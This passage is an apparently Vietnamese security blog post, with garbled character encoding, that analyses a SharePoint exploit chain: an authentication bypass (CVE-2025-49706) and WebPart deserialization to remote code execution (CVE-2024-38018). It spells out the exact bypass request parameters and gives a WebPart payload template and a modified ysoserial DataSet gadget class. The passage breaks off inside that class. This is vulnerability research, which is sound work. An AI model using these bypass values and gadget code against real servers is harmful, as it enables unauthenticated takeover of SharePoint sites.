2 bÆ°á»›c: Bypass Authen vÃ  Deserialize to RCE.<br>Äá»ƒ tiáº¿n hÃ nh debug vÃ  Ä‘á»c source cá»§a Sharepoint thÃ¬ mÃ¬nh sá»­ dá»¥ng Dnspy, chá»n Attach to Process vÃ  trá» Ä‘Ãºng tiáº¿n trÃ¬nh IIS w3wp.exe Ä‘ang cháº¡y Collection Site cá»§a Sharepoint táº¡i port 80:<br><img src=https://hackmd.io/_uploads/Hydk_5kBWe.png loading=lazy alt=image><br>Má»Ÿ tab Modules Ä‘á»ƒ xem cÃ¡c file dll Ä‘ang Ä‘Æ°á»£c tiáº¿n trÃ¬nh load, tá»« Ä‘Ã³ cÃ³ Ä‘Æ°á»£c dll Ä‘ang Ä‘Æ°á»£c Sharepoint load:<br><img src=https://hackmd.io/_uploads/rJUruqyHZx.png loading=lazy alt=image><br></p><h3 id=cve-2025-49706-bypass-authentication>[CVE-2025-49706] Bypass Authentication</h3><p>CVE-2025-49706 xáº£y ra táº¡i class SPRequestModule thuá»™c namespace Microsoft.SharePoint.ApplicationRuntime. ÄÃ¢y lÃ  má»™t class implements IHttpModule, sá»­ dá»¥ng Ä‘á»ƒ chá»©a cÃ¡c EventHandler trong request pipeline cá»§a IIS.<br>Táº¡i Ä‘Ã¢y, method PostAuthenticateRequestHandler Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ xá»­ lÃ½ xÃ¡c thá»±c cÃ¡c HTTP request Ä‘áº¿n trong Sharepoint, chÃ­nh vÃ¬ váº­y nÃ³ Ä‘Æ°á»£c gá»i chá»‰ sau event BeginRequest:<br><img src=https://hackmd.io/_uploads/rJ53O51HWe.png loading=lazy alt=image><br>BÃªn trong hÃ m tá»“n táº¡i Ä‘oáº¡n code xá»­ lÃ½ truy cáº­p cÃ¡c file css js Ä‘á»‘i vá»›i ngÆ°á»i dÃ¹ng khÃ´ng xÃ¡c thá»±c nhÆ° sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>if (!context.User.Identity.IsAuthenticated){
</span></span><span class=line><span class=cl>    if (flag4){
</span></span><span class=line><span class=cl>       if (this.RequestPathIndex == SPRequestModule.PathIndex._layouts){
</span></span><span class=line><span class=cl>          Uri uri3 = null;
</span></span><span class=line><span class=cl>          try{
</span></span><span class=line><span class=cl>             uri3 = context.Request.UrlReferrer;
</span></span><span class=line><span class=cl>          }
</span></span><span class=line><span class=cl>          catch (UriFormatException){}
</span></span><span class=line><span class=cl>          if (uri3 != null){
</span></span><span class=line><span class=cl>             string absolutePath = uri3.AbsolutePath;
</span></span><span class=line><span class=cl>             if (SPRequestModule.s_LoginUrl == null){
</span></span><span class=line><span class=cl>                ULS.SendTraceTag(2470943U, ULSCat.msoulscat_WSS_Runtime, ULSTraceLevel.Unexpected, &#34;LoginUrl is unset for request to &#39;{0}&#39;.&#34;, new object[] { SPAlternateUrl.ContextUri });
</span></span><span class=line><span class=cl>             }
</span></span><span class=line><span class=cl>             else if (absolutePath.EndsWith(SPRequestModule.s_LoginUrl, StringComparison.OrdinalIgnoreCase) &amp;&amp; (text2.EndsWith(&#34;.css&#34;, StringComparison.OrdinalIgnoreCase) || text2.EndsWith(&#34;.js&#34;, StringComparison.OrdinalIgnoreCase))){
</span></span><span class=line><span class=cl>                context.SkipAuthorization = true;
</span></span><span class=line><span class=cl>             }
</span></span><span class=line><span class=cl>          }
</span></span><span class=line><span class=cl>       }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    else if (!flag6 &amp;&amp; settingsForContext != null &amp;&amp; settingsForContext.UseClaimsAuthentication &amp;&amp; !settingsForContext.AllowAnonymous){
</span></span><span class=line><span class=cl>       ...
</span></span><span class=line><span class=cl>       SPUtility.SendAccessDeniedHeader(new UnauthorizedAccessException());
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    else if (flag5){
</span></span><span class=line><span class=cl>       ...
</span></span><span class=line><span class=cl>       SPUtility.SendAccessDeniedHeader(new UnauthorizedAccessException());
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>Logic code sáº½ cho phÃ©p ngÆ°á»i dÃ¹ng unauthen váº«n cÃ³ thá»ƒ truy cáº­p cÃ¡c file script js vÃ  stylesheet css Ä‘á»ƒ phá»¥c vá»¥ viá»‡c hiá»ƒn thá»‹. CÃ¡c trÆ°á»ng há»£p cÃ²n láº¡i sáº½ kiá»ƒm tra nháº±m tráº£ vá» status 401 vá» cho ngÆ°á»i dÃ¹ng. CÃ³ 3 nhÃ¡nh if else, náº¿u nhÆ° lÃ m cho false cáº£ 3 thÃ¬ ngÆ°á»i dÃ¹ng khÃ´ng xÃ¡c thá»±c cÃ³ thá»ƒ bypass Ä‘oáº¡n check nÃ y vÃ  tiáº¿p tá»¥c Ä‘Æ°á»£c xá»­ lÃ½ yÃªu cáº§u. Äá»ƒ lÃ m Ä‘Æ°á»£c Ä‘iá»u Ä‘Ã³ thÃ¬ cáº§n flag6 lÃ  true, cÃ²n flag4 vÃ  flag5 cáº§n cÃ³ giÃ¡ trá»‹ false.<br>Xem xÃ©t Ä‘oáº¡n code Ä‘áº±ng trÆ°á»›c, ta tháº¥y Ä‘Æ°á»£c náº¿u nhÆ° flag4 mang giÃ¡ trá»‹ false thÃ¬ chÆ°Æ¡ng trÃ¬nh sáº½ nháº£y vÃ o nhÃ¡nh if(flag5) vÃ¬ flag5 = !flag4 = true:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=ne>bool</span> <span class=n>flag4</span> <span class=o>=</span> <span class=n>SPSecurity</span><span class=o>.</span><span class=n>AuthenticationMode</span> <span class=o>==</span> <span class=n>AuthenticationMode</span><span class=o>.</span><span class=n>Forms</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=n>flag2</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=ne>bool</span> <span class=n>flag5</span> <span class=o>=</span> <span class=o>!</span><span class=n>flag4</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>ULS</span><span class=o>.</span><span class=n>SendTraceTag</span><span class=p>(</span><span class=mi>2373643</span><span class=n>U</span><span class=p>,</span> <span class=n>ULSCat</span><span class=o>.</span><span class=n>msoulscat_WSS_Runtime</span><span class=p>,</span> <span class=n>ULSTraceLevel</span><span class=o>.</span><span class=n>Verbose</span><span class=p>,</span> <span class=s2>&#34;Value for checkAuthenticationCookie is : {0}&#34;</span><span class=p>,</span> <span class=n>new</span> <span class=n>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>flag5</span> <span class=p>});</span>
</span></span><span class=line><span class=cl><span class=ne>bool</span> <span class=n>flag6</span> <span class=o>=</span> <span class=bp>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>string</span> <span class=n>text2</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>Request</span><span class=o>.</span><span class=n>FilePath</span><span class=o>.</span><span class=n>ToLowerInvariant</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>flag5</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=n>Uri</span> <span class=n>uri2</span> <span class=o>=</span> <span class=n>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>try</span><span class=p>{</span>
</span></span><span class=line><span class=cl>       <span class=n>uri2</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>Request</span><span class=o>.</span><span class=n>UrlReferrer</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>catch</span> <span class=p>(</span><span class=n>UriFormatException</span><span class=p>){}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>this</span><span class=o>.</span><span class=n>IsShareByLinkPage</span><span class=p>(</span><span class=n>context</span><span class=p>)</span> <span class=o>||</span> <span class=n>this</span><span class=o>.</span><span class=n>IsAnonymousVtiBinPage</span><span class=p>(</span><span class=n>context</span><span class=p>)</span> <span class=o>||</span> <span class=n>this</span><span class=o>.</span><span class=n>IsAnonymousDynamicRequest</span><span class=p>(</span><span class=n>context</span><span class=p>)</span> <span class=o>||</span> <span class=n>context</span><span class=o>.</span><span class=n>Request</span><span class=o>.</span><span class=n>Path</span><span class=o>.</span><span class=n>StartsWith</span><span class=p>(</span><span class=n>this</span><span class=o>.</span><span class=n>signoutPathRoot</span><span class=p>)</span> <span class=o>||</span> <span class=n>context</span><span class=o>.</span><span class=n>Request</span><span class=o>.</span><span class=n>Path</span><span class=o>.</span><span class=n>StartsWith</span><span class=p>(</span><span class=n>this</span><span class=o>.</span><span class=n>signoutPathPrevious</span><span class=p>)</span> <span class=o>||</span> <span class=n>context</span><span class=o>.</span><span class=n>Request</span><span class=o>.</span><span class=n>Path</span><span class=o>.</span><span class=n>StartsWith</span><span class=p>(</span><span class=n>this</span><span class=o>.</span><span class=n>signoutPathCurrent</span><span class=p>)</span> <span class=o>||</span> <span class=n>context</span><span class=o>.</span><span class=n>Request</span><span class=o>.</span><span class=n>Path</span><span class=o>.</span><span class=n>StartsWith</span><span class=p>(</span><span class=n>this</span><span class=o>.</span><span class=n>startPathRoot</span><span class=p>)</span> <span class=o>||</span> <span class=n>context</span><span class=o>.</span><span class=n>Request</span><span class=o>.</span><span class=n>Path</span><span class=o>.</span><span class=n>StartsWith</span><span class=p>(</span><span class=n>this</span><span class=o>.</span><span class=n>startPathPrevious</span><span class=p>)</span> <span class=o>||</span> <span class=n>context</span><span class=o>.</span><span class=n>Request</span><span class=o>.</span><span class=n>Path</span><span class=o>.</span><span class=n>StartsWith</span><span class=p>(</span><span class=n>this</span><span class=o>.</span><span class=n>startPathCurrent</span><span class=p>)</span> <span class=o>||</span> <span class=p>(</span><span class=n>uri2</span> <span class=o>!=</span> <span class=n>null</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>SPUtility</span><span class=o>.</span><span class=n>StsCompareStrings</span><span class=p>(</span><span class=n>uri2</span><span class=o>.</span><span class=n>AbsolutePath</span><span class=p>,</span> <span class=n>this</span><span class=o>.</span><span class=n>signoutPathRoot</span><span class=p>)</span> <span class=o>||</span> <span class=n>SPUtility</span><span class=o>.</span><span class=n>StsCompareStrings</span><span class=p>(</span><span class=n>uri2</span><span class=o>.</span><span class=n>AbsolutePath</span><span class=p>,</span> <span class=n>this</span><span class=o>.</span><span class=n>signoutPathPrevious</span><span class=p>)</span> <span class=o>||</span> <span class=n>SPUtility</span><span class=o>.</span><span class=n>StsCompareStrings</span><span class=p>(</span><span class=n>uri2</span><span class=o>.</span><span class=n>AbsolutePath</span><span class=p>,</span> <span class=n>this</span><span class=o>.</span><span class=n>signoutPathCurrent</span><span class=p>)))){</span>
</span></span><span class=line><span class=cl>       <span class=n>flag5</span> <span class=o>=</span> <span class=bp>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>       <span class=n>flag6</span> <span class=o>=</span> <span class=bp>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Trong nhÃ¡nh if(flag5), server láº¥y ra giÃ¡ trá»‹ cá»§a header Referer vÃ  so sÃ¡nh giÃ¡ trá»‹ cá»§a cá»§a nÃ³ vá»›i giÃ¡ trá»‹ signoutPathRoot, signoutPathPrevious vÃ  signoutPathCurrent. Chá»‰ cáº§n má»™t trong cÃ¡c Ä‘iá»u kiá»‡n trÃªn Ä‘Ãºng thÃ¬ chÆ°Æ¡ng trÃ¬nh sáº½ set giÃ¡ trá»‹ flag5 lÃ  false vÃ  flag6 lÃ  true, Ä‘Ãºng vá»›i Ã½ Ä‘á»‹nh ban Ä‘áº§u. CÃ¡c giÃ¡ trá»‹ signoutPath mang giÃ¡ trá»‹ nhÆ° sau:<br><img src=https://hackmd.io/_uploads/B1F-K9yrbx.png loading=lazy alt=image><br>HÃ m GetLayoutsFolder tráº£ vá» giÃ¡ trá»‹ <code>_layouts/15</code> hoáº·c <code>_layouts</code>:<br><img src=https://hackmd.io/_uploads/rkcfYcyrZe.png loading=lazy alt=image><br>Máº·c Ä‘á»‹nh thÃ¬ flag4 sáº½ cÃ³ giÃ¡ trá»‹ false, nÃªn Ä‘á»ƒ bypass cÆ¡ cháº¿ xÃ¡c thá»±c nÃ y, giÃ¡ trá»‹ cá»§a header Referer sáº½ lÃ  <code>/_layouts/SignOut.aspx</code> hoáº·c <code>/_layouts/15/SignOut.aspx</code>:<br><img src=https://hackmd.io/_uploads/BJ_VK5yH-e.png loading=lazy alt=image><br>PoC req gá»i khÃ´ng xÃ¡c thá»±c:<br><img src=https://hackmd.io/_uploads/HJCBY5yBbe.png loading=lazy alt=image><br>Req bypass auth:<br><img src=https://hackmd.io/_uploads/Skq8t9kBZg.png loading=lazy alt=image><br>Tiáº¿p tá»¥c Ä‘i Ä‘áº¿n nÆ¡i trigger lá»— há»•ng trong PoC lÃ  file ToolPane.aspx, báº£n thÃ¢n file khÃ´ng cÃ³ gÃ¬ Ä‘áº·c biá»‡t mÃ  chá»‰ cÃ³ Ä‘oáº¡n khai bÃ¡o code control náº±m táº¡i class Microsoft.SharePoint.WebPartPages.ToolPane:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;%@ Register TagPrefix=&#34;WebPartPages&#34; Namespace=&#34;Microsoft.SharePoint.WebPartPages&#34;%&gt;
</span></span><span class=line><span class=cl>&lt;WebPartPages:ToolPane runat=&#34;server&#34;/&gt;
</span></span></code></pre></td></tr></table></div></div><p>Táº¡i Ä‘Ã¢y, Method OnInit Ä‘Æ°á»£c gá»i Ä‘áº§u tiÃªn Ä‘á»ƒ khá»Ÿi táº¡o page, Ä‘á»“ng thá»i gá»i Ä‘áº¿n CheckForCustomToolpane Ä‘á»ƒ kiá»ƒm tra Ä‘Æ°á»ng dáº«n cÃ³ pháº£i Ä‘á»ƒ táº¡o ToolPane khÃ´ng:<br><img src=https://hackmd.io/_uploads/BkQNqc1rZl.png loading=lazy alt=image><br>HÃ m CheckForCustomToolpane kiá»ƒm tra Ä‘Æ°á»ng dáº«n URL xem cÃ³ chá»©a <code>/_layouts/</code> vÃ  káº¿t thÃºc báº±ng <code>/ToolPane.aspx</code> hay khÃ´ng, náº¿u cÃ³ sáº½ tráº£ vá» true:<br><img src=https://hackmd.io/_uploads/BywB9qkSWg.png loading=lazy alt=image><br>Tiáº¿p theo, chÆ°Æ¡ng trÃ¬nh sáº½ xá»­ lÃ½ Ä‘áº¿n hÃ m SelectedAspWebPart, nÆ¡i mÃ  ná»™i dung WebPart truyá»n trong body sáº½ Ä‘Æ°á»£c xá»­ lÃ½ thÃ´ng qua 2 giÃ¡ trá»‹ táº¡i body lÃ  MSOTlPn_Uri vÃ  MSOTlPn_DWP:<br><img src=https://hackmd.io/_uploads/SyHLq51Hbx.png loading=lazy alt=image><br>MSOTlPn_Uri chá»©a Ä‘Æ°á»ng dáº«n frontPage, cÃ²n MSOTlPn_DWP chá»©a ná»™i dung thÃ´ng tin vá» Web Part Ä‘á»ƒ tiáº¿n hÃ nh import, logic import sáº½ náº±m táº¡i hÃ m GetPartPreviewAndPropertiesFromMarkup. Äá»ƒ vÃ o Ä‘Æ°á»£c cÃ¢u lá»‡nh if thÃ¬ cÃ²n Ä‘iá»u kiá»‡n DisplayMode = EditDisplayMode, hay <code>?DisplayMode=Edit</code>.<br>Nháº£y vÃ o GetPartPreviewAndPropertiesFromMarkup - hÃ m xá»­ lÃ½ trá»±c tiáº¿p import webpart lÃ  GetMarkupProperties, cÅ©ng lÃ  sink vuln deserialize báº±ng webpart. NhÆ°ng trÆ°á»›c khi Ä‘áº¿n Ä‘Æ°á»£c hÃ m Ä‘Ã³ cáº§n pháº£i thá»a mÃ£n táº¥t cáº£ nhá»¯ng dÃ²ng lá»‡nh trÃªn, trong Ä‘Ã³ cÃ³ CreateAndInitializeDocumentDesigner, vá»›i input pageUri chÃ­nh lÃ  param MSOTlPn_Uri Ä‘Ã£ truyá»n vÃ o trÆ°á»›c Ä‘Ã³:<br><img src=https://hackmd.io/_uploads/B111j5yrWe.png loading=lazy alt=image><br>CreateAndInitializeDocumentDesigner sáº½ gá»i Ä‘áº¿n method Create cá»§a class ServerWebFileFromFileSystem vá»›i callstack:<br><img src=https://hackmd.io/_uploads/B1HeoqkS-g.png loading=lazy alt=image><br>Táº¡i method nÃ y, chÆ°Æ¡ng trÃ¬nh tiáº¿n hÃ nh kiá»ƒm tra url truyá»n vÃ o cÃ³ chá»©a <code>_controltemplates/</code> vÃ  cÃ³ pháº£i file .ascx khÃ´ng, náº¿u tá»“n táº¡i thÃ¬ tráº£ vá» object ServerWebFile dá»±a trÃªn file tháº­t, khÃ´ng sáº½ tráº£ vá» null:<br><img src=https://hackmd.io/_uploads/rJUWoc1B-l.png loading=lazy alt=image><br>Nháº±m thá»a mÃ£n dÃ²ng lá»‡nh trÃªn, cáº§n tÃ¬m file ascx tÃ¹y Ã½ náº±m trong folder <code>_controltemplates/</code>, mÃ¬nh lá»±a chá»n <code>_controltemplates/15/ActionBar.ascx</code> Ä‘á»ƒ poc vÃ¬ nÃ³ á»Ÿ ngay Ä‘áº§u.<br>CÅ©ng cÃ³ hÆ¡i nhiá»u Ä‘iá»u kiá»‡n rá»“i, tá»•ng há»£p láº¡i Ä‘á»ƒ bypass authen vÃ o Ä‘Æ°á»£c endpoint ToolPane.aspx, mÃ¬nh cáº§n:</p><ul><li>Referer header: <code>/_layouts/15/SignOut.aspx</code></li><li>URL param: <code>DisplayMode=Edit</code></li><li>URL pháº£i káº¿t thÃºc báº±ng /ToolPane.aspx: thÃªm má»™t url param tÃ¹y Ã½ vá»›i giÃ¡ trá»‹ lÃ  /ToolPane.aspx</li><li>MSOTlPn_Uri: <code>http://sp-server/my/_controltemplates/15/ActionBar.ascx</code></li></ul><h3 id=cve-2024-38018-webpart-properties-insecure-deserialize>[CVE-2024-38018] WebPart Properties Insecure Deserialize</h3><p>KhÃºc nÃ y sáº½ hÆ¡i cáº¥n vÃ¬ táº¡i sao mÃ¬nh láº¡i khÃ´ng dÃ¹ng CVE-2025-49704 mÃ  láº¡i lÃ  má»™t CVE khÃ¡c. Khi tiáº¿n hÃ nh thá»­ poc Ä‘á»ƒ test thÃ¬ mÃ¬nh confirm Ä‘Ã£ bypass auth nhÆ°ng láº¡i khÃ´ng thá»ƒ trigger deser, nÃ³ sáº½ vÄƒng ra lá»—i file Web Part not valid, mÃ¬nh Ä‘oÃ¡n lÃ  do cáº¥u trÃºc Webpart cá»§a phiÃªn báº£n 2013 vÃ  2019 cÃ³ sá»± khÃ¡c biá»‡t nÃªn khi import vÃ o bá»‹ lá»—i. (Váº­y mÃ  microsoft báº£o ráº±ng exploit Ä‘Æ°á»£c á»Ÿ má»i phiÃªn báº£n Sharepoint 2013)<br>MÃ y mÃ² cÃ i Service Pack vÃ  cÃ i tiáº¿p báº£n patch cho Sharepoint nhÆ°ng cÅ©ng khÃ´ng giÃ²n. MÃ¬nh cÃ³ Ä‘i há»i vÃ  biáº¿t Ä‘Æ°á»£c ngÆ°á»i anh em xÃ£ há»™i cÅ©ng gáº·p váº¥n Ä‘á» tÆ°Æ¡ng tá»±, vÃ  ngÆ°á»i anh em Ä‘Ã³ Ä‘Ã£ cho mÃ¬nh má»™t solution khÃ¡c: sá»­ dá»¥ng CVE-2024-38018 - má»™t CVE khÃ¡c attack vÃ o Insecure Deserialize property cá»§a webpart. PoC cá»§a lá»— há»•ng Ä‘Ã£ Ä‘Æ°á»£c Ä‘á» cáº­p vÃ  phÃ¢n tÃ­ch khÃ¡ chi tiáº¿t táº¡i <a class=link href=https://blog.viettelcybersecurity.com/sharepoint_properties_deser/ target=_blank rel=noopener>https://blog.viettelcybersecurity.com/sharepoint_properties_deser/</a> nÃªn mÃ¬nh cÅ©ng khÃ¡ lÃ  Äƒn theo thÃ´i :)))<br>Tiáº¿p tá»¥c phÃ¢n tÃ­ch nÃ o, mÃ¬nh sáº½ láº¥y pháº§n webpart cá»§a bÃ i phÃ¢n tÃ­ch trÃªn:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;%@ Register Tagprefix=&#34;WebPartPages&#34; Namespace=&#34;Microsoft.SharePoint.WebPartPages&#34; Assembly=&#34;Microsoft.SharePoint, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c&#34; %&gt;
</span></span><span class=line><span class=cl>&lt;WebPartPages:XmlWebPart ID=&#34;SPWebPartManager&#34; runat=&#34;Server&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;WebPart xmlns=&#34;http://schemas.microsoft.com/WebPart/v2&#34;&gt;
</span></span><span class=line><span class=cl>&lt;AttachedPropertiesShared&gt;{SerializeData}&lt;/AttachedPropertiesShared&gt;
</span></span><span class=line><span class=cl>    &lt;/WebPart&gt;
</span></span><span class=line><span class=cl>&lt;/WebPartPages:XmlWebPart&gt;
</span></span></code></pre></td></tr></table></div></div><p>CVE-2024-38018 Ä‘Ã£ khai thÃ¡c lá»— há»•ng Insecure Deserialize dá»¯ liá»‡u DataSet thÃ´ng qua cÆ¡ cháº¿ parse webpart control Ä‘á»ƒ thá»±c thi code tá»« xa, báº¯t Ä‘áº§u tá»« method <code>WebPart.AddParsedSubObject()</code>. Method nÃ y sáº½ luÃ´n Ä‘Æ°á»£c gá»i khi truyá»n vÃ o má»™t webpart control, vá»›i má»¥c Ä‘Ã­ch láº¥y toÃ n bá»™ chuá»—i truyá»n vÃ o Ä‘Ã£ loáº¡i bá» pháº§n register vÃ  reference assembly thÃ´ng qua class LiteralControl Ä‘á»ƒ Ä‘Æ°a vÃ o method ParseXml:<br><img src=https://hackmd.io/_uploads/B1hFR5JrZe.png loading=lazy alt=image><br>ParseXml thá»±c hiá»‡n deserialize dá»¯ liá»‡u truyá»n vÃ o thÃ´ng qua XmlSerializer. Deserialize, tráº£ vá» object webPart vÃ  tiáº¿p tá»¥c gá»i Ä‘áº¿n DoPostDeserializationTasks Ä‘á»ƒ thá»±c hiá»‡n má»™t sá»‘ thao tÃ¡c sau láº§n deserialize Ä‘áº§u tiÃªn:<br><img src=https://hackmd.io/_uploads/H1pq0ckBbg.png loading=lazy alt=image><br>DoPostDeserializationTasks sáº½ tiáº¿p tá»¥c call Ä‘áº¿n GetAttachedProperties, táº¡i Ä‘Ã¢y thuá»™c tÃ­nh <code>_serializedAttachedPropertiesShared</code> Ä‘Æ°á»£c deserialize vá»›i binder SPSerializationBinder:<br><img src=https://hackmd.io/_uploads/B1aj0cyBZl.png loading=lazy alt=image><br>Trong khi Ä‘Ã³, <code>_serializedAttachedPropertiesShared</code> cÃ³ thá»ƒ Ä‘Æ°á»£c set giÃ¡ trá»‹ báº±ng element tag AttachedPropertiesShared:<br><img src=https://hackmd.io/_uploads/ByQT09yrZg.png loading=lazy alt=image><br>Binder SPSerializationBinder cho phÃ©p thá»±c hiá»‡n deserialize vá»›i báº¥t kÃ¬ class nÃ o thuá»™c SafeControls - lÃ  má»™t thuá»™c tÃ­nh Ä‘Æ°á»£c khai bÃ¡o trong web.config cá»§a Sharepoint site, chá»©a danh sÃ¡ch cÃ¡c assembly, namespace vÃ  class Ä‘Æ°á»£c phÃ©p gá»i Ä‘áº¿n vÃ  sá»­ dá»¥ng trong Sharepoint:<br><img src=https://hackmd.io/_uploads/S1bCRc1rZx.png loading=lazy alt=image><br>Trong Ä‘á»‘ng class nÃ y, vÃ´ tÃ¬nh lÃ m sao cÃ³ chá»©a SPThemes káº¿ thá»«a class DataSet, cÅ©ng nhÆ° sá»­ dá»¥ng constructor cá»§a Dataset:<br><img src=https://hackmd.io/_uploads/H1UlJo1Sbx.png loading=lazy alt=image><br>CÃ³ DataSet lÃ  ngon luÃ´n, mÃ¬nh Ä‘á»›p ngay gadget chain dataset Ä‘Æ°á»£c sá»­ dá»¥ng trong ysoserial, chain nÃ y sáº½ call Ä‘áº¿n method deserialize DataSet.Tables_0 báº±ng BinaryFormatter mÃ  khÃ´ng kiá»ƒm tra binder. á» Ä‘Ã¢y sá»­a Ä‘oáº¡n code DataSetGenerator thÃ nh type SPThemes lÃ  oke:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=p>[</span><span class=n>Serializable</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>public</span> <span class=k>class</span> <span class=n>DataSetMarshalMod</span> <span class=p>:</span> <span class=n>ISerializable</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>private</span> <span class=n>byte</span><span class=p>[]</span> <span class=n>_fakeTable</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>public</span> <span class=n>void</span> <span class=n>GetObjectData</span><span class=p>(</span><span class=n>SerializationInfo</span> <span class=n>info</span><span class=p>,</span> <span class=n>StreamingContext</span> <span class=n>context</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=o>.</span><span class=n>SetType</span><span class=p>(</span><span class=nb>typeof</span><span class=p>(</span><span class=n>SPThemes</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=o>.</span><span class=n>AddValue</span><span class=p>(</span><span class=s2>&#34;DataSet.RemotingFormat&#34;</span><span class=p>,</span> <span class=n>SerializationFormat</span><span class=o>.</span><span class=n>Binary</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=o>.</span><span class=n>AddValue</span><span class=p>(</span><span class=s2>&#34;DataSet.DataSetName&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=o>.</span><span class=n>AddValue</span><span class=p>(</span><span class=s2>&#34;DataSet.Namespace&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=o>.</span><span class=n>AddValue</span><span class=p>(</span><span class=s2>&#34;DataSet.Prefix&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=o>.</span><span class=n>AddValue</span><span class=p>(</span><span class=s2>&#34;DataSet.CaseSensitive&#34;</span><span class=p>,</span> <span class=bp>false</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=o>.</span><span class=n>AddValue</span><span class=p>(</span><span class=s2>&#34;DataSet.LocaleLCID&#34;</span><span class=p>,</span> <span class=mi>1033</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>info</span><span class=o>.</span><span class=n>AddValue</span><span class=p>(</span><span class=s2>&#34;DataSet.EnforceConstraints&#34;</span><span class=p>,</span> <span class=bp>false</span><span class=p>);</span>
